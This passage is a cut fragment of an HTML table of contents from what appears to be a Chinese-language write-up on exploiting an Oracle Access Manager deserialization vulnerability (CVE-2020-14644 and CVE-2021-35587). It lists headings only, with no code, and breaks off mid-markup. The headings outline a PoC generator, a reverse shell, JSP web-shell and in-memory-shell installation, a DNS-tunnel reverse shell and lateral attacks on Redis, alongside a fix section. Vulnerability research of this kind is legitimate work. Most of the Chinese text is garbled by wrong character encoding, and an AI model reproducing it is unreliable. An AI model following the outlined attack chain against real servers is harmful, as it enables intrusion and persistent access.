aria-label=è§£å†³äº”ï¼šä¿®æ”¹DB_SCHEMA_PASSWORD>è§£å†³äº”ï¼šä¿®æ”¹<code>DB_SCHEMA_PASSWORD</code></a></li><li><a href=#%e6%88%90%e6%9e%9c aria-label=æˆæœ>æˆæœ</a></li></ul></li></ul></li><li><a href=#%e5%88%9b%e5%bb%ba%e5%ae%b9%e5%99%a8%e4%ba%8coamms aria-label=â‘£åˆ›å»ºå®¹å™¨äºŒoamms>â‘£åˆ›å»ºå®¹å™¨äºŒoamms</a></li><li><a href=#%e5%88%9b%e5%bb%ba%e5%ae%b9%e5%99%a8%e4%b8%89oampolicy aria-label=â‘¤åˆ›å»ºå®¹å™¨ä¸‰oampolicy>â‘¤åˆ›å»ºå®¹å™¨ä¸‰oampolicy</a></li><li><a href=#%e9%aa%8c%e8%af%81%e6%9c%8d%e5%8a%a1%e5%8f%af%e7%94%a8%e6%80%a7 aria-label=â‘¥éªŒè¯æœåŠ¡å¯ç”¨æ€§>â‘¥éªŒè¯æœåŠ¡å¯ç”¨æ€§</a></li><li><a href=#%e5%90%af%e5%81%9c%e4%b8%8e%e5%88%a0%e9%99%a4 aria-label=â‘¦å¯åœä¸åˆ é™¤>â‘¦å¯åœä¸åˆ é™¤</a></li></ul></li><li><a href=#%e8%bf%9c%e7%a8%8b%e8%b0%83%e8%af%95oam aria-label=è¿œç¨‹è°ƒè¯•OAM>è¿œç¨‹è°ƒè¯•OAM</a><ul><li><a href=#%e5%a4%a7%e7%ba%b2-1 aria-label=å¤§çº²>å¤§çº²</a></li><li><a href=#%e6%ad%a5%e9%aa%a4%e6%b1%87%e6%80%bb-1 aria-label=æ­¥éª¤æ±‡æ€»>æ­¥éª¤æ±‡æ€»</a></li><li><a href=#%e9%9c%80%e8%a6%81%e5%85%b3%e6%b3%a8%e7%9a%84%e5%ae%b9%e5%99%a8%e5%92%8c%e8%bf%9b%e7%a8%8b aria-label=â‘ éœ€è¦å…³æ³¨çš„å®¹å™¨å’Œè¿›ç¨‹>â‘ éœ€è¦å…³æ³¨çš„å®¹å™¨å’Œè¿›ç¨‹</a></li><li><a href=#%e7%9b%91%e6%8e%a7web%e5%ba%94%e7%94%a8%e6%97%a5%e5%bf%97 aria-label=â‘¡ç›‘æ§webåº”ç”¨æ—¥å¿—>â‘¡ç›‘æ§webåº”ç”¨æ—¥å¿—</a></li><li><a href=#%e5%90%91%e6%bc%8f%e6%b4%9e%e6%8e%a5%e5%8f%a3%e5%8f%91%e9%80%81%e5%9f%ba%e6%9c%ac%e8%af%b7%e6%b1%82 aria-label=â‘¢å‘æ¼æ´æ¥å£å‘é€åŸºæœ¬è¯·æ±‚>â‘¢å‘æ¼æ´æ¥å£å‘é€åŸºæœ¬è¯·æ±‚</a></li><li><a href=#%e7%a1%ae%e5%ae%9a%e5%85%b3%e9%94%ae%e6%96%ad%e7%82%b9%e7%9a%84%e4%bd%8d%e7%bd%ae%e5%92%8c%e7%9b%b8%e5%85%b3%e7%9a%84%e4%be%9d%e8%b5%96%e5%8c%85 aria-label=â‘£ç¡®å®šå…³é”®æ–­ç‚¹çš„ä½ç½®å’Œç›¸å…³çš„ä¾èµ–åŒ…>â‘£ç¡®å®šå…³é”®æ–­ç‚¹çš„ä½ç½®å’Œç›¸å…³çš„ä¾èµ–åŒ…</a></li><li><a href=#%e4%b8%8b%e8%bd%bd%e4%be%9d%e8%b5%96%e5%8c%85%e5%88%b0%e8%b0%83%e8%af%95%e4%b8%bb%e6%9c%ba aria-label=â‘¤ä¸‹è½½ä¾èµ–åŒ…åˆ°è°ƒè¯•ä¸»æœº>â‘¤ä¸‹è½½ä¾èµ–åŒ…åˆ°è°ƒè¯•ä¸»æœº</a></li><li><a href=#%e5%bc%80%e5%a7%8b%e8%b0%83%e8%af%95 aria-label=â‘¥å¼€å§‹è°ƒè¯•>â‘¥å¼€å§‹è°ƒè¯•</a></li></ul></li><li><a href=#%e8%b0%83%e8%af%95%e5%88%86%e6%9e%90 aria-label=è°ƒè¯•åˆ†æ>è°ƒè¯•åˆ†æ</a><ul><ul><li><a href=#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%85%a5%e5%8f%a3 aria-label=ååºåˆ—åŒ–å…¥å£>ååºåˆ—åŒ–å…¥å£</a></li><li><a href=#%e6%9e%84%e9%80%a0sessionid%e5%af%b9%e8%b1%a1%e8%a7%a6%e5%8f%91%e6%ad%a3%e5%b8%b8%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96 aria-label=æ„é€ SessionIDå¯¹è±¡è§¦å‘æ­£å¸¸ååºåˆ—åŒ–>æ„é€ SessionIDå¯¹è±¡è§¦å‘æ­£å¸¸ååºåˆ—åŒ–</a></li><li><a href=#%e5%85%b3%e8%81%94%e6%bc%8f%e6%b4%9ecve-2020-14644 aria-label=å…³è”æ¼æ´ï¼šCVE-2020-14644>å…³è”æ¼æ´ï¼šCVE-2020-14644</a><ul><li><a href=#%e6%9e%84%e9%80%a0%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96demo aria-label=æ„é€ ååºåˆ—åŒ–demo>æ„é€ ååºåˆ—åŒ–demo</a></li><li><a href=#%e8%b0%83%e8%af%95%e5%88%86%e6%9e%90-1 aria-label=è°ƒè¯•åˆ†æ>è°ƒè¯•åˆ†æ</a><ul><li><a href=#%e5%bc%80%e5%a7%8b%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96 aria-label=å¼€å§‹ååºåˆ—åŒ–>å¼€å§‹ååºåˆ—åŒ–</a></li><li><a href=#%e6%9e%84%e5%bb%ba-remoteconstructor-%e5%af%b9%e8%b1%a1 aria-label="æ„å»º RemoteConstructor å¯¹è±¡">æ„å»º RemoteConstructor å¯¹è±¡</a></li><li><a href=#%e6%9e%84%e5%bb%baobject%e5%af%b9%e8%b1%a1m_aoargs aria-label=æ„å»ºObject[]å¯¹è±¡ï¼ˆm_aoArgsï¼‰>æ„å»ºObject[]å¯¹è±¡ï¼ˆm_aoArgsï¼‰</a></li><li><a href=#%e6%9e%84%e5%bb%ba-classdefinition-%e5%af%b9%e8%b1%a1m_definition aria-label="æ„å»º ClassDefinition å¯¹è±¡ï¼ˆm_definitionï¼‰">æ„å»º ClassDefinition å¯¹è±¡ï¼ˆm_definitionï¼‰</a></li><li><a href=#%e6%9e%84%e5%bb%babyte-array%e5%af%b9%e8%b1%a1m_abclass aria-label="æ„å»ºByte Arrayå¯¹è±¡ï¼ˆm_abClassï¼‰">æ„å»ºByte Arrayå¯¹è±¡ï¼ˆm_abClassï¼‰</a></li><li><a href=#%e6%9e%84%e5%bb%ba-classidentity-%e5%af%b9%e8%b1%a1m_id aria-label="æ„å»º ClassIdentity å¯¹è±¡ï¼ˆm_idï¼‰">æ„å»º ClassIdentity å¯¹è±¡ï¼ˆm_idï¼‰</a></li><li><a href=#%e4%be%9d%e6%ac%a1%e6%9e%84%e5%bb%bam_spackagem_sbasenamem_sversion aria-label=ä¾æ¬¡æ„å»ºm_sPackage/m_sBaseName/m_sVersion>ä¾æ¬¡æ„å»ºm_sPackage/m_sBaseName/m_sVersion</a></li><li><a href=#%e5%ae%8c%e6%88%90--classidentity-%e5%af%b9%e8%b1%a1m_id%e5%a1%ab%e5%85%85 aria-label="å®Œæˆ  ClassIdentity å¯¹è±¡ï¼ˆm_idï¼‰å¡«å……">å®Œæˆ ClassIdentity å¯¹è±¡ï¼ˆm_idï¼‰å¡«å……</a></li><li><a href=#%e5%ae%8c%e6%88%90classdefinition-%e5%af%b9%e8%b1%a1m_definition%e5%a1%ab%e5%85%85 aria-label="å®ŒæˆClassDefinition å¯¹è±¡ï¼ˆm_definitionï¼‰å¡«å……">å®ŒæˆClassDefinition å¯¹è±¡ï¼ˆm_definitionï¼‰å¡«å……</a></li><li><a href=#%e5%ae%8c%e6%88%90-remoteconstructor-%e5%af%b9%e8%b1%a1%e5%a1%ab%e5%85%85 aria-label="å®Œæˆ RemoteConstructor å¯¹è±¡å¡«å……">å®Œæˆ RemoteConstructor å¯¹è±¡å¡«å……</a></li><li><a href=#readresolve aria-label=readResolve>readResolve</a></li><li><a href=#%e5%8f%8d%e5%b0%84%e8%b0%83%e7%94%a8readresolve aria-label=åå°„è°ƒç”¨readResolve>åå°„è°ƒç”¨readResolve</a></li><li><a href=#sink%e7%82%b9 aria-label=sinkç‚¹>sinkç‚¹</a></li><li><a href=#%e5%88%9b%e5%bb%ba%e6%81%b6%e6%84%8f%e7%b1%bbdefineclass aria-label=åˆ›å»ºæ¶æ„ç±»ï¼šdefineClass>åˆ›å»ºæ¶æ„ç±»ï¼šdefineClass</a></li><li><a href=#%e5%ae%9e%e4%be%8b%e5%8c%96%e6%81%b6%e6%84%8f%e7%b1%bbcreateinstance aria-label=å®ä¾‹åŒ–æ¶æ„ç±»ï¼šcreateInstance>å®ä¾‹åŒ–æ¶æ„ç±»ï¼šcreateInstance</a></li><li><a href=#%e6%89%a7%e8%a1%8c%e6%9e%84%e9%80%a0%e5%87%bd%e6%95%b0%e6%81%b6%e6%84%8f%e4%bb%a3%e7%a0%81 aria-label=æ‰§è¡Œæ„é€ å‡½æ•°ï¼ˆæ¶æ„ä»£ç ï¼‰>æ‰§è¡Œæ„é€ å‡½æ•°ï¼ˆæ¶æ„ä»£ç ï¼‰</a></li><li><a href=#%e8%bf%94%e5%9b%9e%e5%88%9b%e5%bb%ba%e7%9a%84%e5%af%b9%e8%b1%a1 aria-label=è¿”å›åˆ›å»ºçš„å¯¹è±¡>è¿”å›åˆ›å»ºçš„å¯¹è±¡</a></li></ul></li></ul></li><li><a href=#%e6%9e%84%e9%80%a0payload aria-label=æ„é€ payload>æ„é€ payload</a></li><li><a href=#%e7%9b%b4%e6%8e%a5%e4%bd%bf%e7%94%a8gadgetclassnotfoundexception aria-label=ç›´æ¥ä½¿ç”¨gadgetï¼šClassNotFoundException>ç›´æ¥ä½¿ç”¨gadgetï¼šClassNotFoundException</a></li><li><a href=#%e5%bb%b6%e9%95%bfgadget aria-label=å»¶é•¿gadget>å»¶é•¿gadget</a></li><li><a href=#%e7%a7%bb%e6%a4%8dgadget%e6%8a%a5%e9%94%99noclassdeffounderror aria-label=ç§»æ¤gadgetæŠ¥é”™ï¼šNoClassDefFoundError>ç§»æ¤gadgetæŠ¥é”™ï¼šNoClassDefFoundError</a><ul><li><a href=#noclassdeffounderror aria-label=NoClassDefFoundError>NoClassDefFoundError</a></li><li><a href=#%e9%94%99%e8%af%af%e5%87%ba%e5%9c%a8defineclass aria-label=é”™è¯¯å‡ºåœ¨defineclass>é”™è¯¯å‡ºåœ¨defineclass</a></li><li><a href=#%e6%8e%92%e9%99%a4%e5%ad%97%e8%8a%82%e7%a0%81%e7%b1%bb%e5%90%8d%e4%b8%8d%e5%8c%b9%e9%85%8d aria-label=æ’é™¤å­—èŠ‚ç ç±»åä¸åŒ¹é…>æ’é™¤å­—èŠ‚ç ç±»åä¸åŒ¹é…</a></li><li><a href=#%e6%9c%ac%e5%9c%b0defineclass-demo%e8%b0%83%e8%af%95 aria-label="æœ¬åœ°defineClass demoè°ƒè¯•">æœ¬åœ°defineClass demoè°ƒè¯•</a></li><li><a href=#%e6%b7%bb%e5%8a%a0%e4%be%9d%e8%b5%96%e5%90%8e%e6%9c%ac%e5%9c%b0%e5%8f%af%e6%88%90%e5%8a%9fdefineclass aria-label=æ·»åŠ ä¾èµ–åæœ¬åœ°å¯æˆåŠŸdefineClass>æ·»åŠ ä¾èµ–åæœ¬åœ°å¯æˆåŠŸdefineClass</a></li><li><a href=#%e4%bd%bf%e7%94%a8arthas%e5%9c%a8%e6%9c%8d%e5%8a%a1%e7%ab%af%e8%83%bd%e6%89%be%e5%88%b0remotable-%e7%b1%bb aria-label="ä½¿ç”¨arthasåœ¨æœåŠ¡ç«¯èƒ½æ‰¾åˆ°Remotable ç±»">ä½¿ç”¨arthasåœ¨æœåŠ¡ç«¯èƒ½æ‰¾åˆ°<code>Remotable</code> ç±»</a></li><li><a href=#%e5%b0%9d%e8%af%95%e4%bd%bf%e7%94%a8arthas%e6%b7%bb%e5%8a%a0%e8%87%aa%e5%ae%9a%e4%b9%89%e7%b1%bb aria-label=å°è¯•ä½¿ç”¨arthasæ·»åŠ è‡ªå®šä¹‰ç±»>å°è¯•ä½¿ç”¨arthasæ·»åŠ è‡ªå®šä¹‰ç±»</a></li><li><a href=#%e6%9c%ac%e5%9c%b0%e8%bf%9c%e7%a8%8bdemo%e5%af%b9%e6%af%94 aria-label=æœ¬åœ°è¿œç¨‹demoå¯¹æ¯”>æœ¬åœ°è¿œç¨‹demoå¯¹æ¯”</a></li><li><a href=#%e5%b0%9d%e8%af%95%e8%b0%83%e8%af%95oamms%e5%ae%b9%e5%99%a8%e4%b8%ad%e7%9a%84defineclass%e8%bf%87%e7%a8%8b aria-label=å°è¯•è°ƒè¯•oammså®¹å™¨ä¸­çš„defineClassè¿‡ç¨‹>å°è¯•è°ƒè¯•oammså®¹å™¨ä¸­çš„defineClassè¿‡ç¨‹</a><ul><li><a href=#%e6%af%94%e5%af%b9abclass%e6%95%b0%e7%bb%84%e6%98%af%e5%90%a6%e4%b8%80%e8%87%b4%e4%b8%80%e8%87%b4 aria-label=æ¯”å¯¹abClassæ•°ç»„æ˜¯å¦ä¸€è‡´ï¼šä¸€è‡´>æ¯”å¯¹abClassæ•°ç»„æ˜¯å¦ä¸€è‡´ï¼šä¸€è‡´</a></li><li><a href=#%e6%b2%a1%e6%9c%89%e5%b0%86%e5%ad%97%e8%8a%82%e7%a0%81%e5%86%99%e5%88%b0%e7%a3%81%e7%9b%98%e4%b8%ad%e4%bd%86%e5%ad%98%e5%9c%a8%e8%b7%a8%e8%b7%af%e5%be%84%e5%86%99%e6%96%87%e4%bb%b6 aria-label=â˜…æ²¡æœ‰å°†å­—èŠ‚ç å†™åˆ°ç£ç›˜ä¸­ï¼Œä½†å­˜åœ¨è·¨è·¯å¾„å†™æ–‡ä»¶>â˜…æ²¡æœ‰å°†å­—èŠ‚ç å†™åˆ°ç£ç›˜ä¸­ï¼Œä½†å­˜åœ¨è·¨è·¯å¾„å†™æ–‡ä»¶</a></li><li><a href=#%e8%bf%9b%e5%85%a5defineclass aria-label=è¿›å…¥defineClass>è¿›å…¥defineClass</a></li><li><a href=#jump-into-rabbit-hole aria-label="jump into rabbit hole">jump into rabbit hole</a></li><li><a href=#%e4%bb%8etransform%e5%86%8d%e5%bc%80%e5%a7%8b aria-label=ä»transformå†å¼€å§‹>ä»transformå†å¼€å§‹</a></li><li><a href=#%e6%9f%b3%e6%9a%97%e8%8a%b1%e6%98%8e aria-label=æŸ³æš—èŠ±æ˜>æŸ³æš—èŠ±æ˜</a></li></ul></li></ul></li><li><a href=#from-cve-2020-14644-to-cve-2021-35587 aria-label="From CVE-2020-14644 to CVE-2021-35587">From CVE-2020-14644 to CVE-2021-35587</a></li></ul></ul></li><li><a href=#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8 aria-label=æ¼æ´åˆ©ç”¨>æ¼æ´åˆ©ç”¨</a><ul><li><a href=#%e6%96%b0%e5%bb%ba%e7%94%9f%e6%88%90poc%e7%9a%84%e5%b7%a5%e7%a8%8b aria-label=æ–°å»ºç”ŸæˆPoCçš„å·¥ç¨‹>æ–°å»ºç”ŸæˆPoCçš„å·¥ç¨‹</a></li><li><a href=#genpocjava%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%a1%86%e6%9e%b6 aria-label=genpoc.javaï¼šæ¼æ´åˆ©ç”¨æ¡†æ¶>genpoc.javaï¼šæ¼æ´åˆ©ç”¨æ¡†æ¶</a></li><li><a href=#revjava%e5%8f%8d%e5%bc%b9shell aria-label=rev.javaï¼šåå¼¹shell>rev.javaï¼šåå¼¹shell</a><ul><li><a href=#%e4%bc%98%e7%bc%ba%e7%82%b9 aria-label=ä¼˜ç¼ºç‚¹>ä¼˜ç¼ºç‚¹</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c aria-label=æœ€ç»ˆæ•ˆæœ>æœ€ç»ˆæ•ˆæœ</a></li></ul></li><li><a href=#wjspjava%e9%81%8d%e5%8e%86%e7%9b%ae%e5%bd%95%e5%86%99jsp%e6%9c%a8%e9%a9%ac aria-label=wjsp.javaï¼šéå†ç›®å½•å†™jspæœ¨é©¬>wjsp.javaï¼šéå†ç›®å½•å†™jspæœ¨é©¬</a><ul><li><a href=#%e6%8e%a2%e7%b4%a2%e8%bf%87%e7%a8%8b aria-label=æ¢ç´¢è¿‡ç¨‹>æ¢ç´¢è¿‡ç¨‹</a></li><li><a href=#%e4%bc%98%e7%bc%ba%e7%82%b9-1 aria-label=ä¼˜ç¼ºç‚¹>ä¼˜ç¼ºç‚¹</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-1 aria-label=æœ€ç»ˆæ•ˆæœ>æœ€ç»ˆæ•ˆæœ</a></li></ul></li><li><a href=#wjspxjava%e9%81%8d%e5%8e%86%e7%9b%ae%e5%bd%95%e5%8d%b8%e8%bd%bdjsp%e6%9c%a8%e9%a9%ac aria-label=wjspx.javaï¼šéå†ç›®å½•å¸è½½jspæœ¨é©¬>wjspx.javaï¼šéå†ç›®å½•å¸è½½jspæœ¨é©¬</a><ul><li><a href=#%e6%b3%a8%e6%84%8f%e7%82%b9 aria-label=æ³¨æ„ç‚¹>æ³¨æ„ç‚¹</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-2 aria-label=æœ€ç»ˆæ•ˆæœ>æœ€ç»ˆæ•ˆæœ</a></li></ul></li><li><a href=#wjsp2java%e7%b2%be%e5%87%86%e5%ae%9a%e4%bd%8d%e4%b8%b4%e6%97%b6%e7%9b%ae%e5%bd%95%e5%86%99jsp%e6%9c%a8%e9%a9%ac aria-label=wjsp2.javaï¼šç²¾å‡†å®šä½ä¸´æ—¶ç›®å½•å†™jspæœ¨é©¬>wjsp2.javaï¼šç²¾å‡†å®šä½ä¸´æ—¶ç›®å½•å†™jspæœ¨é©¬</a><ul><li><a href=#%e6%8e%a2%e7%b4%a2%e8%bf%87%e7%a8%8b-1 aria-label=æ¢ç´¢è¿‡ç¨‹>æ¢ç´¢è¿‡ç¨‹</a></li><li><a href=#%e4%bc%98%e7%bc%ba%e7%82%b9-2 aria-label=ä¼˜ç¼ºç‚¹>ä¼˜ç¼ºç‚¹</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-3 aria-label=æœ€ç»ˆæ•ˆæœ>æœ€ç»ˆæ•ˆæœ</a></li></ul></li><li><a href=#wjsp2xjava%e7%b2%be%e5%87%86%e5%ae%9a%e4%bd%8d%e4%b8%b4%e6%97%b6%e7%9b%ae%e5%bd%95%e5%8d%b8%e8%bd%bdjsp%e6%9c%a8%e9%a9%ac aria-label=wjsp2x.javaï¼šç²¾å‡†å®šä½ä¸´æ—¶ç›®å½•å¸è½½jspæœ¨é©¬>wjsp2x.javaï¼šç²¾å‡†å®šä½ä¸´æ—¶ç›®å½•å¸è½½jspæœ¨é©¬</a><ul><li><a href=#%e6%b3%a8%e6%84%8f%e7%82%b9-1 aria-label=æ³¨æ„ç‚¹>æ³¨æ„ç‚¹</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-4 aria-label=æœ€ç»ˆæ•ˆæœ>æœ€ç»ˆæ•ˆæœ</a></li></ul></li><li><a href=#servjava%e9%80%9a%e8%bf%87servlet%e5%9b%9e%e6%98%be%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e7%9a%84%e7%bb%93%e6%9e%9c aria-label=serv.javaï¼šé€šè¿‡servletå›æ˜¾å‘½ä»¤æ‰§è¡Œçš„ç»“æœ>serv.javaï¼šé€šè¿‡servletå›æ˜¾å‘½ä»¤æ‰§è¡Œçš„ç»“æœ</a><ul><li><a href=#%e6%8e%a2%e7%b4%a2%e8%bf%87%e7%a8%8b-2 aria-label=æ¢ç´¢è¿‡ç¨‹>æ¢ç´¢è¿‡ç¨‹</a></li><li><a href=#%e4%bc%98%e7%bc%ba%e7%82%b9-3 aria-label=ä¼˜ç¼ºç‚¹>ä¼˜ç¼ºç‚¹</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-5 aria-label=æœ€ç»ˆæ•ˆæœ>æœ€ç»ˆæ•ˆæœ</a></li></ul></li><li><a href=#memsijava%e5%ae%89%e8%a3%85%e5%86%85%e5%ad%98%e9%a9%ac aria-label=memsi.javaï¼šå®‰è£…å†…å­˜é©¬>memsi.javaï¼šå®‰è£…å†…å­˜é©¬</a><ul><li><a href=#%e6%8e%a2%e7%b4%a2%e8%bf%87%e7%a8%8b-3 aria-label=æ¢ç´¢è¿‡ç¨‹>æ¢ç´¢è¿‡ç¨‹</a><ul><li><a href=#%e8%8e%b7%e5%8f%96servlet-mapping aria-label="è·å–servlet mapping">è·å–servlet mapping</a></li><li><a href=#%e6%b3%a8%e5%86%8cservlet aria-label=æ³¨å†Œservlet>æ³¨å†Œservlet</a></li><li><a href=#%e5%88%a0%e9%99%a4servlet aria-label=åˆ é™¤servlet>åˆ é™¤servlet</a></li><li><a href=#%e4%bd%bf%e7%94%a8%e5%ad%97%e8%8a%82%e7%a0%81%e5%ae%9a%e4%b9%89servlet aria-label=ä½¿ç”¨å­—èŠ‚ç å®šä¹‰servlet>ä½¿ç”¨å­—èŠ‚ç å®šä¹‰servlet</a></li><li><a href=#%e8%a7%a3%e5%86%b3duplicate-class-definition aria-label="è§£å†³duplicate class definition">è§£å†³duplicate class definition</a></li><li><a href=#webshell%e5%af%86%e7%a0%81%e5%88%a4%e6%96%ad%e7%9a%84%e5%86%99%e6%b3%95%e5%87%ba%e9%94%99 aria-label=webshellå¯†ç åˆ¤æ–­çš„å†™æ³•å‡ºé”™>webshellå¯†ç åˆ¤æ–­çš„å†™æ³•å‡ºé”™</a></li><li><a href=#%e5%a2%9e%e5%bc%ba%e5%85%bc%e5%ae%b9%e6%97%a0%e9%99%90%e9%87%8d%e6%94%be aria-label=å¢å¼ºå…¼å®¹ï¼Œæ— é™é‡æ”¾>å¢å¼ºå…¼å®¹ï¼Œæ— é™é‡æ”¾</a></li></ul></li><li><a href=#%e4%bc%98%e7%bc%ba%e7%82%b9-4 aria-label=ä¼˜ç¼ºç‚¹>ä¼˜ç¼ºç‚¹</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-6 aria-label=æœ€ç»ˆæ•ˆæœ>æœ€ç»ˆæ•ˆæœ</a></li><li><a href=#%e5%8f%82%e8%80%83%e9%98%85%e8%af%bb aria-label=å‚è€ƒé˜…è¯»>å‚è€ƒé˜…è¯»</a></li></ul></li><li><a href=#memsdjava%e5%8d%b8%e8%bd%bd%e5%86%85%e5%ad%98%e9%a9%ac aria-label=memsd.javaï¼šå¸è½½å†…å­˜é©¬>memsd.javaï¼šå¸è½½å†…å­˜é©¬</a><ul><li><a href=#%e6%b3%a8%e6%84%8f%e7%82%b9-2 aria-label=æ³¨æ„ç‚¹>æ³¨æ„ç‚¹</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-7 aria-label=æœ€ç»ˆæ•ˆæœ>æœ€ç»ˆæ•ˆæœ</a></li><li><a href=#%e6%97%a0%e5%9b%9e%e6%98%be%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4 aria-label=æ— å›æ˜¾æ‰§è¡Œå‘½ä»¤>æ— å›æ˜¾æ‰§è¡Œå‘½ä»¤</a></li><li><a href=#%e5%9b%9e%e6%98%be%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4 aria-label=å›æ˜¾æ‰§è¡Œå‘½ä»¤>å›æ˜¾æ‰§è¡Œå‘½ä»¤</a></li><li><a href=#%e6%b3%a8%e5%85%a5%e5%86%85%e5%ad%98%e9%a9%ac aria-label=æ³¨å…¥å†…å­˜é©¬>æ³¨å…¥å†…å­˜é©¬</a></li><li><a href=#%e5%8d%b8%e8%bd%bd%e6%9b%b4%e6%96%b0%e5%86%85%e5%ad%98%e9%a9%ac aria-label=å¸è½½/æ›´æ–°å†…å­˜é©¬>å¸è½½/æ›´æ–°å†…å­˜é©¬</a></li><li><a href=#%e6%9c%ba%e5%99%a8%e4%b8%8d%e5%87%ba%e7%bd%91%e6%97%b6%e5%a4%8d%e7%94%a8dns%e9%9a%a7%e9%81%93%e5%8f%8d%e5%bc%b9shell aria-label=æœºå™¨ä¸å‡ºç½‘æ—¶å¤ç”¨DNSéš§é“åå¼¹shell>æœºå™¨ä¸å‡ºç½‘æ—¶å¤ç”¨DNSéš§é“åå¼¹shell</a></li><li><a href=#%e6%a8%aa%e5%90%91%e6%94%bb%e5%87%bb%e5%86%85%e7%bd%91redis aria-label=æ¨ªå‘æ”»å‡»å†…ç½‘Redis>æ¨ªå‘æ”»å‡»å†…ç½‘Redis</a></li></ul></li><li><a href=#%e4%b8%80%e4%ba%9b%e6%9c%a8%e9%a9%ac aria-label=ä¸€äº›æœ¨é©¬>ä¸€äº›æœ¨é©¬</a><ul><li><a href=#%e6%99%ae%e9%80%9ajsp%e6%9c%a8%e9%a9%ac aria-label=æ™®é€šJSPæœ¨é©¬>æ™®é€šJSPæœ¨é©¬</a></li><li><a href=#%e5%8a%a0%e5%af%86%e6%b5%81%e9%87%8fjsp%e6%9c%a8%e9%a9%ac aria-label=åŠ å¯†æµé‡JSPæœ¨é©¬>åŠ å¯†æµé‡JSPæœ¨é©¬</a></li><li><a href=#%e6%99%ae%e9%80%9a%e5%86%85%e5%ad%98%e9%a9%ac aria-label=æ™®é€šå†…å­˜é©¬>æ™®é€šå†…å­˜é©¬</a></li><li><a href=#%e5%8a%a0%e5%af%86%e6%b5%81%e9%87%8f%e5%86%85%e5%ad%98%e9%a9%ac aria-label=åŠ å¯†æµé‡å†…å­˜é©¬>åŠ å¯†æµé‡å†…å­˜é©¬</a></li></ul></li><li><a href=#%e4%bf%ae%e5%a4%8d aria-label=ä¿®å¤>ä¿®å¤</a></li></ul></li><li><a href=#%e8%b0%83%e8%af%95%e6%8a%80%e5%b7%a7%e5%92%8c%e5%b8%b8%e8%a7%81%e9%97%ae%e9%a2%98 aria-label=è°ƒè¯•æŠ€å·§å’Œå¸¸è§é—®é¢˜>è°ƒè¯•æŠ€å·§å’Œå¸¸è§é—®é¢˜</a><ul><li><a href=#%e9%87%8d%e7%bd%ae%e5%88%b0%e8%b0%83%e7%94%a8%e6%a0%88%e6%9f%90%e4%b8%aa%e6%a0%88%e5%b8%a7 aria-label=é‡ç½®åˆ°è°ƒç”¨æ ˆæŸä¸ªæ ˆå¸§>é‡ç½®åˆ°è°ƒç”¨æ ˆæŸä¸ªæ ˆå¸§</a></li><li><a href=#%e5%bc%82%e5%b8%b8%e6%96%ad%e7%82%b9%e5%a6%82%e4%bd%95%e5%ba%94%e5%af%b9%e4%bb%8e%e6%b2%a1%e6%9c%89%e4%ba%ba%e9%81%87%e5%88%b0%e8%bf%87%e7%9a%84%e6%8a%a5%e9%94%99 aria-label=å¼‚å¸¸æ–­ç‚¹ï¼šå¦‚ä½•åº”å¯¹ä»æ²¡æœ‰äººé‡åˆ°è¿‡çš„æŠ¥é”™>å¼‚å¸¸æ–­ç‚¹ï¼šå¦‚ä½•åº”å¯¹ä»æ²¡æœ‰äººé‡åˆ°è¿‡çš„æŠ¥é”™</a></li><li><a href=#%e6%9d%a1%e4%bb%b6%e6%96%ad%e7%82%b9%e9%99%90%e5%88%b6%e6%96%ad%e7%82%b9%e8%a7%a6%e5%8f%91%e5%9c%ba%e6%99%af%e5%87%8f%e5%b0%91%e5%b9%b2%e6%89%b0%e4%bf%a1%e6%81%af aria-label=æ¡ä»¶æ–­ç‚¹ï¼šé™åˆ¶æ–­ç‚¹è§¦å‘åœºæ™¯å‡å°‘å¹²æ‰°ä¿¡æ¯>æ¡ä»¶æ–­ç‚¹ï¼šé™åˆ¶æ–­ç‚¹è§¦å‘åœºæ™¯å‡å°‘å¹²æ‰°ä¿¡æ¯</a></li><li><a href=#evaluate-expression%e5%8a%9f%e8%83%bd aria-label="Evaluate ExpressionåŠŸèƒ½">Evaluate ExpressionåŠŸèƒ½</a></li><li><a href=#%e5%a6%82%e4%bd%95%e7%a1%ae%e5%ae%9ajvm%e4%b8%ad%e6%98%af%e5%90%a6%e5%8a%a0%e8%bd%bd%e4%ba%86%e6%9f%90%e4%b8%aa%e7%b1%bb aria-label=å¦‚ä½•ç¡®å®šJVMä¸­æ˜¯å¦åŠ è½½äº†æŸä¸ªç±»ï¼Ÿ>å¦‚ä½•ç¡®å®šJVMä¸­æ˜¯å¦åŠ è½½äº†æŸä¸ªç±»ï¼Ÿ</a></li><li><a href=#%e5%a6%82%e4%bd%95%e4%b8%8d%e8%b0%83%e8%af%95%e6%9f%a5%e7%9c%8b%e6%9c%8d%e5%8a%a1%e7%ab%af%e6%9f%90%e6%96%b9%e6%b3%95%e7%9a%84%e8%bf%94%e5%9b%9e%e5%80%bc aria-label=å¦‚ä½•ä¸è°ƒè¯•æŸ¥çœ‹æœåŠ¡ç«¯æŸæ–¹æ³•çš„è¿”å›å€¼ï¼Ÿ>å¦‚ä½•ä¸è°ƒè¯•æŸ¥çœ‹æœåŠ¡ç«¯æŸæ–¹æ³•çš„è¿”å›å€¼ï¼Ÿ</a></li><li><a href=#%e4%b8%ba%e4%bd%95%e6%9c%89%e6%97%b6%e6%8c%82%e4%b8%8a%e8%b0%83%e8%af%95%e5%90%8e%e5%ba%94%e7%94%a8%e5%8d%a1%e6%ad%bb 